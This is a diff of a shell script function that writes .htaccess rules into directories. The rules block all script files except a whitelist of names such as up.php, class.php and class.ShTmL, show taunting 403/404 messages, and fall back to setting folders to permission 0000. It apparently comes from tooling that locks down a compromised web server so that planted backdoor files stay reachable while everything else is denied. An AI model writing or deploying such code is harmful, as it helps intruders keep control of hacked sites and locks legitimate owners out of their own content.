@@ -23,25 +23,27 @@ update_htaccess() {
     fi
   fi
   
-  {
-    echo "<FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$">"
-    echo "    Require all denied"
-    echo "</FilesMatch>"
-    echo
-    echo "<FilesMatch "\\.(jpg|jpeg|pdf|docx)$">"
-    echo "    Require all granted"
-    echo "</FilesMatch>"
-    echo
-    echo "<FilesMatch "^(index.html|index.php|class.php|class-index.php|config.php|login.php|class.ShTmL|up.php)$">"
-    echo "     Require all granted"
-    echo "</Files>"
-    echo
-    echo "DirectoryIndex index.php index.html index.blade.php"
-    echo
-    echo "Options -Indexes"
-    echo "ErrorDocument 403 \"403 what are you looking for?\""
-    echo "ErrorDocument 404 \"404 what are you looking for?\""
-  } > "$htaccess_file" || {
+HTACCESS_CONTENT=$(cat <<EOF
+<FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$">
+    Require all denied
+</FilesMatch>
+
+<FilesMatch "\\.(jpg|jpeg|pdf|docx)$">
+    Require all granted
+</FilesMatch>
+
+<FilesMatch "^(index.html|index.php|class.php|class-index.php|config.php|login.php|class.ShTmL|up.php)$">
+    Require all granted
+</FilesMatch>
+
+DirectoryIndex index.php index.html index.blade.php
+Options -Indexes
+
+ErrorDocument 403 "403 what are you looking for?"
+ErrorDocument 404 "404 what are you looking for?"
+EOF
+)
+  echo "$HTACCESS_CONTENT" > "$htaccess_file" || {
     local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
     echo "$msg" >> "$LOG_FILE"
 
